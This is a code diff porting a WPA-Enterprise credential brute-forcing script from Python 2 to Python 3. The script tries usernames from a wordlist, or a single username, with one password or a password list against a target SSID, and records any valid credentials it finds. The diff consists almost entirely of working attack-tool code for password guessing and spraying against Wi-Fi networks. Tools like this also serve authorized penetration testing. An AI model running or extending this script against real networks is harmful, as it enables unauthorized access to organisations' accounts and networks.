@@ -1,9 +1,10 @@
-#!/usr/bin/env python
+#!/usr/bin/env python3
 
 import argparse
 import datetime
 import time
 import sys
+from os import path
 
 from wpa_supplicant.core import WpaSupplicantDriver
 from twisted.internet.selectreactor import SelectReactor
@@ -27,7 +28,7 @@ def connect_to_wifi(ssid, password, username,
                     authentication="wpa-enterprise"):
     valid_credentials_found = False
 
-    print "Trying %s:%s..." % (username, password)
+    print(f"\r\033[K Trying {username}, {password}", end='')
 
     # WPA Enterprise configuration
     if authentication == "wpa-enterprise":
@@ -63,15 +64,16 @@ def connect_to_wifi(ssid, password, username,
             if state == "completed":
                 credentials_valid = 1
                 break
-        except Exception, e:
-            print e
+        except Exception as e:
+            print(e)
             break
 
         time.sleep(test_interval)   
         seconds_passed += test_interval
 
     if credentials_valid == 1:
-        print "[!] VALID CREDENTIALS: %s:%s" % (username, password)
+        #print( "[!] VALID CREDENTIALS: %s:%s" % (username, password))
+        print(f"\r\033[K [!] VALID CREDENTIALS: {username}, {password}", end='\r\n')
         if outfile:              
             f = open(outfile, 'a')
 
@@ -109,7 +111,7 @@ parser.add_argument('-i', type=str, required=True, metavar='interface',
 parser.add_argument('-e', type=str, required=True,
                     dest='ssid', help='SSID of the target network')
 parser.add_argument('-u', type=str, required=True, dest='userfile', 
-                    help='Username wordlist')
+                    help='Username wordlist or single username')
 parser.add_argument('-P', dest='password', default=None,
                     help='Password to try on each username')
 parser.add_argument('-p', dest='passfile', default=None,
@@ -133,11 +135,11 @@ args = parser.parse_args()
 
 
 if (args.password == None) and (args.passfile == None):
-    print "You must specify a password or password list."
+    print( "You must specify a password or password list.")
     exit()
 
 if (args.start != 0) and (args.passfile != None):
-    print "The start line option may not be used with a password list."
+    print( "The start line option may not be used with a password list.")
     exit()
 
 device          = args.device
@@ -151,6 +153,7 @@ stop_on_success = args.stop_on_success
 attempt_delay   = args.attempt_delay
 
 if passfile != None:
+
     f = open(passfile, 'r')
     content = f.read()
     f.close()
@@ -183,14 +186,17 @@ except:
 
 
 # Read usernames into array, users
-f = open(userfile, 'r')
-users = [l.rstrip() for l in f.readlines()]
-f.close()
+if path.isfile(userfile):
+    f = open(userfile, 'r')
+    users = [l.rstrip() for l in f.readlines()]
+    f.close()
+else:
+    users = [userfile]
 
 try:
     for password in passwords:
         for n in range(start, len(users)):
-            print "[%s] " % n,
+            #print( "[%s] " % n,)
             valid_credentials_found = connect_to_wifi(ssid=ssid, 
                                                       username=str(users[n]), 
                                                       password=str(password), 
@@ -206,17 +212,15 @@ try:
                 break
     
     if reactor.running == True:
-            reactor.sigBreak()
+            reactor.sigBreak(0)
 
-    print "DONE!"
+    print( "DONE!")
 except KeyboardInterrupt:
     # Stop the running reactor so the program can exit
     if reactor.running == True:
         reactor.sigBreak()
-    print "Attack stopped by user."
-except Exception, e:
-    print e
+    print ("Attack stopped by user.")
+except Exception as e:
+    print( e)
     if reactor.running == True:
         reactor.sigBreak()
-
-
